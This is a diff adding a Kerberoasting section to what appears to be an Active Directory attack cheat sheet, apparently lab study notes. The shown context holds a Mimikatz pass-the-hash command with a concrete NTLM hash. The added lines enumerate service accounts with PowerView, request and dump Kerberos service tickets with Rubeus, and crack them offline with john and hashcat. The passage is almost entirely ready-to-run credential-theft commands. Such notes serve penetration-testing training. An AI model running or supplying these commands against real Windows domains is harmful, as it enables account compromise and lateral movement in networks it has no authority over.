@@ -179,6 +179,18 @@ Invoke-Mimikatz -Command '"sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<nt
 Invoke-Mimikatz -Command '"sekurlsa::pth /user:srvadmin /domain:dollarcorp.moneycorp.local /ntlm:a98e18228819e8eec3dfa33cb68b0728 /run:powershell.exe"'
 ```
 
+#### Kerberoast
+
+```powershell
+Get-NetUser -SPN | select serviceprincipalname
+Request-SPNTicket -SPN "<serviceprincipalname>"
+.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
+
+
+john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
+hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
+```
+
 
 #### Mimikatz
 
